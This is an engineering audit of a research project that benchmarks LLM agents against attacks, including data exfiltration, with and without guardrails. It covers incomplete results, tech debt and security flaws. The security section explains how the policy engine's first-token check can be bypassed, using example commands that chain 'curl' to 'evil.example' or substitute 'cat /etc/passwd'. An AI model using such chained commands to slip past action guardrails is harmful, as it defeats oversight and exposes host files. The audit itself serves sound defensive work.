---
last_mapped_commit: 94cffd318d559d0d6afc2bec044c79d6fd0533d3
last_mapped_at: 2026-10-20
---
# Codebase Concerns

**Analysis Date:** 2026-10-20

## Tech Debt

**From-scratch model (`src/scratch_llm/`) is incomplete:**
- Issue: `generate_episodes()` raises `NotImplementedError`. The modules that `src/llm/scratch.py` depends on do not exist: `src/scratch_llm/train.py` and `src/scratch_llm/inference.py`. Only `dataset.py`, `format.py` and `model.py` are present.
- Files: `src/scratch_llm/dataset.py` (line 46 onward), `src/llm/scratch.py` (lines 23-25 reference `python -m src.scratch_llm.train` and `src.scratch_llm.inference.load_generator`), `src/llm/registry.py` (line 47-48 routes `provider: scratch` here).
- Impact: The `scratch` provider in `config/models.yaml` cannot load. Any run that selects it fails at import or at the training-data step. `results/final-20261011/scratch-gpt/` contains only a `progress.log` that reports "No benchmark results found", which is consistent with this.
- Fix approach: Implement `generate_episodes()` using the episode format documented in the module docstring and `validate_episode()`, excluding `held_out_tools()`. Then add `train.py` and `inference.py` with a `load_generator` function matching the call in `src/llm/scratch.py`. Until then, either mark the provider as unavailable in `config/models.yaml` or remove it from the registry so it fails with a clear message.

**Partial hosted-model benchmark runs in `results/final-20261011/`:**
- Issue: The expected size per model is 57 cases x 3 runs x 2 arms = 342 unique records. Counts are below, using unique `(case_id, run, arm)` keys from `raw.jsonl`:

| Model | Raw lines | Unique records | Attack lines | Data-stealing (`ds`) lines | `llm_error` lines |
|---|---|---|---|---|---|
| `gemini-flash-lite` | 199 | 195 (147 missing) | 93 | 0 | 0 |
| `gemma-4-31b` | 360 | 342 (complete) | 240 | 120 | 204 |
| `groq-gpt-oss-120b` | 227 | 214 (128 missing) | 112 | 0 | 0 |
| `groq-gpt-oss-20b` | 114 | 112 (230 missing) | 10 | 0 | 0 |
| `groq-qwen3.8-27b` | 211 | 202 (140 missing) | 100 | 0 | 0 |
| `ollama-llama3.2-3b` | 373 | 342 (complete, 31 duplicate lines) | 240 | 120 | 0 |

- Files: `results/final-20261011/{gemini-flash-lite,gemma-4-31b,groq-gpt-oss-120b,groq-gpt-oss-20b,groq-qwen3.8-27b,ollama-llama3.2-3b}/raw.jsonl`, `results/final-20261011/summary.md`.
- Impact:
  - No hosted model has a complete run. Only `gemma-4-31b` and `ollama-llama3.2-3b` reach 342 unique records, and `gemma-4-31b` is mostly timeouts (`"llm_error": "APITimeoutError..."`, 204 of 360 lines).
  - Zero hosted models have any `ds` (data-stealing) episodes. The summary table therefore reports `ds` rows as `—` for every hosted model, so the headline "Success % (guardrails) = 0" is not measured on the data-stealing attack class for those models. Only `ollama-llama3.2-3b` has `ds` coverage (60 episodes).
  - `summary.md` lists `gemma-4-31b` with 0 attack episodes, which is consistent with its attack lines being errors. Its benign row (100% task completion) is also suspect because errored runs are counted.
  - `ollama-llama3.2-3b` has 31 duplicate records. The reporter in `src/benchmark/report.py` should de-duplicate, but the duplicates should be confirmed before the numbers are cited.
  - The `groq-gpt-oss-20b` run is only 10 attack lines, so its "40% attempted" figure rests on 5 episodes.
- Fix approach: Re-run the missing `(case_id, run, arm)` keys with the resume path (`run_benchmark.py`, which already retries episodes that hit API errors per commit `4b1cf7a`). Add a check in `src/benchmark/report.py` that flags models with fewer than 342 unique records or zero `ds` episodes, so incomplete models are excluded or labelled instead of reported as complete. Do not cite the current percentages as final results.

**README describes the agent as Gemini-only:**
- Issue: `README.md` describes the agent as "LLM-powered AI agent (Gemini API)" (line 48), shows "(Gemini)" in the architecture diagram (line 32), and requires a "Google Gemini API key" (line 81). `config/models.yaml` defines Gemini, Groq and Ollama providers, and `src/llm/openai_compat.py` provides a generic OpenAI-compatible client that reads `api_key_env` per model.
- Files: `README.md`, `config/models.yaml`, `src/llm/registry.py`, `src/llm/openai_compat.py`.
- Impact: Users and reviewers following the README will set up only a Gemini key and miss the Groq and Ollama paths. The benchmark results above depend on those providers.
- Fix approach: Update the README to describe the multi-provider registry, list the env vars each provider needs (`GEMINI_API_KEY`, `GROQ_API_KEY`, and a local Ollama base URL for the Ollama provider), and point to `config/models.yaml` as the source of truth.

**Shell execution path with `shell=True`:**
- Issue: `ToolExecutor.run_shell()` runs the agent's command with `subprocess.run(..., shell=True)`. Its docstring already warns that it has full process privileges when unsandboxed.
- Files: `src/agent_harness/tools.py` (lines 55-78).
- Impact: This is the intended "unsandboxed" baseline for the attack comparison, but it means the unprotected arm of `run_attack_simulation.py` and the benchmark runs real commands on the host. A bad benchmark config or a case with a destructive tool could affect the developer machine.
- Fix approach: Keep the unprotected arm, but run the benchmark arms inside a disposable WSL2/Linux environment and document that requirement in `run_benchmark.py` and `scripts/run_full_benchmark.sh`.

**Duplicate and overlapping presentation scripts:**
- Issue: `scripts/generate_presentation.py`, `scripts/modify_template.py` and `scripts/polish_current_deck.py` are untracked and overlap in purpose. `scripts/modify_template.py` hard-codes slide text by index (for example `s22.shapes[10]` at line 313).
- Files: `scripts/generate_presentation.py`, `scripts/modify_template.py`, `scripts/polish_current_deck.py`, `docs/template.pptx`.
- Impact: Shape-index edits break silently when the template changes.
- Fix approach: Keep one script, select shapes by name or placeholder type, and move it under `scripts/` with a short README note.

## Security Considerations

**Policy engine checks only the first word of a shell command:**
- Risk: `PolicyEngine._check_shell_command()` extracts the first token and compares it with the process allow and block lists. The full command is then executed by `/bin/sh` through `shell=True`. Shell metacharacters after the first token are not evaluated as separate commands. Based on code reading (PyYAML was not installed in this environment, so the behaviour was not executed), a command such as `ls; curl http://evil.example` has base command `ls` (allowed). Its later arguments are checked only if they start with `/`, so `http://...` is not checked. The policy would allow it, and the shell would run `curl` too. Command substitution such as `ls $(cat /etc/passwd)` is also not separated from the allowed command; a file argument of the form `/etc/passwd)` may not match the block pattern exactly.
- Files: `src/policy_engine/engine.py` (`_check_shell_command` lines 122-154, `_check_command_file_args` lines 156-173), `src/agent_harness/tools.py` (lines 55-78), `src/policy_engine/policies/default_policy.yaml` (`process` section).
- Current mitigation: The sandbox (`src/sandbox/`) and seccomp filter are the intended second layer. The benchmark attributes blocks mostly to the tool broker and policy engine, and sandbox/seccomp blocks are 0 in every model's results, so the second layer is not exercised by the reported runs.
- Recommendations:
  - Reject or split commands containing `;`, `&&`, `||`, `|`, backticks, `$(`, and redirections before allow-list matching, and check every segment's base command.
  - Add unit tests in `tests/test_policy_engine.py` for chained commands, command substitution and URL arguments.
  - Route policy-allowed commands through `shlex`-parsed argv with `shell=False` where the feature allows it.
  - Confirm the sandbox and seccomp layers actually fire in at least one benchmark arm; a 0 count in every row may indicate they are never reached.

**Dashboard binds to all interfaces with the debugger enabled:**
- Risk: `src/dashboard/app.py` calls `app.run(debug=True, host='0.0.0.0', port=5000)` (line 166). Flask's debug mode exposes the Werkzeug interactive debugger, which allows arbitrary code execution to anyone who can reach the port. Binding to `0.0.0.0` exposes it to the local network.
- Files: `src/dashboard/app.py` (line 166).
- Current mitigation: None in code. The dashboard displays guardrail logs, not secrets.
- Recommendations: Bind to `127.0.0.1` by default, set `debug` from an environment variable that defaults to off, and document the change in the README run instructions.

**Dashboard reads the `.env` file directly:**
- Risk: `src/dashboard/app.py` (around line 44) parses `.env` for a `GEMINI_MODEL=` line by hand. This bypasses the normal config loading and the `.env` file is also read by `PolicyEngine` (around line 42 of `src/policy_engine/engine.py`) to load keys. Two independent parsers can disagree about quoting and comments.
- Files: `src/dashboard/app.py` (around line 44), `src/policy_engine/engine.py` (around line 42).
- Current mitigation: `.env` is listed in `.gitignore` (line 6-9), and `.env.example` is present.
- Recommendations: Use one loader (for example `python-dotenv`) in one place. Do not log or return environment values from the dashboard API.

**Canary data and outbound request handling:**
- Risk: `ToolExecutor.http_request()` (`src/agent_harness/tools.py` lines 111-125) sends arbitrary URLs with `urllib` and has no allow-list of its own. Enforcement depends entirely on `PolicyEngine._check_network()` (`src/policy_engine/engine.py` line 198), which is called only if the caller invokes `check()` first.
- Files: `src/agent_harness/tools.py`, `src/policy_engine/engine.py`, `src/agent_harness/loop.py`.
- Current mitigation: Policy check in the agent loop (to be confirmed per call site).
- Recommendations: Make the executor refuse any call that lacks a passing policy decision, so enforcement is not optional for callers.

## Performance Bottlenecks

**Benchmark wall time is dominated by per-step latency and timeouts:**
- Problem: `gemma-4-31b` averages 61,609 ms per step and has 204 timed-out requests in `results/final-20261011/gemma-4-31b/raw.jsonl`. Hosted runs took 1,000-4,000 ms per step.
- Files: `results/final-20261011/summary.md`, `src/llm/openai_compat.py` (line 29: `timeout` and `max_retries=2`), `run_benchmark.py`.
- Cause: The model is slow or unavailable at the configured timeout, and the client retries inside the request before the benchmark's own resume logic runs.
- Improvement path: Lower the per-request timeout for benchmark runs, record the timeout as a distinct stop reason, and run models in parallel only up to each provider's rate limit. Commit `94cffd3` already adds wait/retry for per-minute rate limits; extend it to timeouts.

**Per-call log re-reads in the dashboard:**
- Problem: `src/dashboard/app.py` caches the guardrail log by `mtime`, which avoids most re-reads. The full file is still parsed on each change, and `logs/guardrails.jsonl` grows without bound.
- Files: `src/dashboard/app.py` (lines 53-70), `logs/guardrails.jsonl`.
- Cause: No rotation or size cap on the JSONL log.
- Improvement path: Tail the last N lines for the dashboard and rotate the log per run.

## Fragile Areas

**Policy matching and path globs:**
- Files: `src/policy_engine/engine.py` (`_check_filesystem` line 175 onward), `src/policy_engine/policies/default_policy.yaml`.
- Why fragile: Paths are matched with glob patterns such as `/home/*/workspace/*` and are not canonicalised first. Symlinks, `..` segments and relative paths are not resolved before the check, so the outcome depends on how the caller spells the path. The default action is `FLAG`, so unmatched actions are not blocked by default.
- Safe modification: Resolve paths with `os.path.realpath` before matching, and add tests for `..`, symlinks and relative paths in `tests/test_policy_engine.py`.
- Test coverage: The policy tests cover the listed rules but not canonicalisation or chained shell input (see the security section).

**Sandbox executor and host-specific assumptions:**
- Files: `src/sandbox/sandbox.py`, `src/sandbox/executor.py`, `src/sandbox/seccomp_filter.c`, `src/sandbox/Makefile`, `setup.sh`, `tests/test_sandbox_detection.py`.
- Why fragile: The sandbox needs Linux namespaces, `libseccomp-dev` and a compiled `seccomp_filter` binary. `src/sandbox/seccomp_filter` is git-ignored, so a fresh checkout must run `make`. The project targets WSL2 (per the README), and this repo is being developed on Windows 11, so sandbox code paths are not exercised in the current environment.
- Safe modification: Keep the detection test (`tests/test_sandbox_detection.py`) passing on non-Linux hosts by skipping rather than failing, and run sandbox tests only under WSL2.
- Test coverage: The sandbox executor tests (`tests/test_sandbox_executor.py`) depend on the compiled binary.

**Benchmark resume and de-duplication:**
- Files: `run_benchmark.py`, `src/benchmark/runner.py`, `src/benchmark/report.py`, `results/final-20261011/*/raw.jsonl`.
- Why fragile: Resume appends to `raw.jsonl` by `(case_id, run, arm)`, which is not enforced at write time. Duplicates (31 in `ollama-llama3.2-3b`) and error records mixed with successful records mean any report that counts lines rather than unique keys will be wrong. Commit `5167d98` added de-duplication in the report, but the summary CSV and charts were generated from a state that still contained errors.
- Safe modification: Make the writer skip keys already present with a non-error status, and make the reporter count only unique, non-error records.

**Experiment outputs are committed-looking artifacts:**
- Files: `results/`, `logs/`, `docs/build/SDD.html`, `docs/build/img/`.
- Why fragile: `results/final-20261011/` is untracked, while `docs/build/` holds generated exports. Regenerating the SDD (`scripts/export_sdd.py`) silently overwrites `docs/build/`, and the results directory has no manifest linking it to a specific code commit.
- Safe modification: Write a `manifest.json` per results directory with the git commit, model config and expected record count.

## Scaling Limits

**Single-threaded, sequential episode execution:**
- Current capacity: One episode at a time per model. Full hosted runs (342 records per model, 6 models) took multiple days of wall time based on timestamps in `progress.log` files.
- Limit: Provider per-minute rate limits (addressed only by waits in `94cffd3`) and the 30-minute retry cap in that commit.
- Scaling path: Add a per-provider concurrency limit and a shared token bucket, then run models in parallel.

**Guardrail log in a single JSONL file:**
- Current capacity: Entire file is read on dashboard refresh (cached by `mtime`).
- Limit: Memory and latency grow linearly with runs.
- Scaling path: Rotate per run directory and index by `run_id`.

## Dependencies at Risk

**Unpinned or loosely pinned Python dependencies:**
- Risk: `requirements.txt` should be checked for version pins. PyYAML (`import yaml` in `src/policy_engine/engine.py` line 29) is required by the policy engine but was missing in the environment used for this analysis, which means the policy engine and its tests cannot run from a bare interpreter.
- Files: `requirements.txt`, `src/policy_engine/engine.py`.
- Impact: The `-I` isolated interpreter used for verification does not find PyYAML; a fresh environment without `pip install -r requirements.txt` fails at import.
- Migration plan: Pin all packages in `requirements.txt` and add a `pytest` smoke test that imports every `src` package.

**Gemini, Groq and Ollama model identifiers:**
- Risk: Model names in `config/models.yaml` (for example `gemma-4-31b`, `groq-qwen3.8-27b`, `gpt-oss`) refer to provider-side model IDs that change or are retired. Results in `results/final-20261011/` are tied to those IDs.
- Impact: Reruns may silently use a different model, which breaks comparison with the existing results.
- Migration plan: Record the resolved model ID (returned by the API) in each `raw.jsonl` record and in `manifest.json`.

## Missing Critical Features

**Data-stealing benchmark coverage for hosted models:**
- Problem: No hosted model has any `ds` episodes in the final run (see the table in Tech Debt). The data-stealing class, which uses canary-seeded private data, is only measured for `ollama-llama3.2-3b` and the errored `gemma-4-31b` lines.
- Blocks: Any claim that guardrails stop data exfiltration across models. The current "Success % (guardrails) = 0" for `ds` applies to one model with 60 episodes.

**From-scratch model end to end:**
- Problem: The provider in `src/llm/scratch.py` cannot run (see Tech Debt).
- Blocks: Evaluating a model trained on the project's own data, and the "from scratch" part of the project scope.

## Test Coverage Gaps

**Scratch model package:**
- What's not tested: `src/scratch_llm/dataset.py` (`generate_episodes`), `format.py` and `model.py` have no tests in `tests/`. `validate_episode` is never exercised.
- Files: `src/scratch_llm/dataset.py`, `src/scratch_llm/format.py`, `src/scratch_llm/model.py`, `tests/test_llm_layer.py`.
- Risk: The incomplete pipeline can change without a failing test.
- Priority: Medium. Add tests for `validate_episode` and the held-out-tool exclusion now, before implementing generation.

**Shell chaining and path canonicalisation in the policy engine:**
- What's not tested: Commands with `;`, `&&`, `|`, `$()`, and paths with `..` or symlinks in `tests/test_policy_engine.py`.
- Files: `src/policy_engine/engine.py`, `tests/test_policy_engine.py`.
- Risk: The bypass in the security section goes unnoticed.
- Priority: High.

**Dashboard endpoints:**
- What's not tested: `tests/test_dashboard_clear.py` covers the clear action only. Binding, debug mode and the `.env` parser are not tested.
- Files: `src/dashboard/app.py`, `tests/test_dashboard_clear.py`.
- Risk: Changes to the host or debug settings are not caught.
- Priority: Low.

**Benchmark reporting over incomplete or errored runs:**
- What's not tested: `src/benchmark/report.py` is not tested against records with `llm_error`, duplicate keys, or missing `ds` episodes.
- Files: `src/benchmark/report.py`, `tests/test_benchmark.py`.
- Risk: Incomplete models appear as complete in `summary.md` (as currently happens for `gemma-4-31b`).
- Priority: High.

---

*Concerns audit: 2026-10-20*
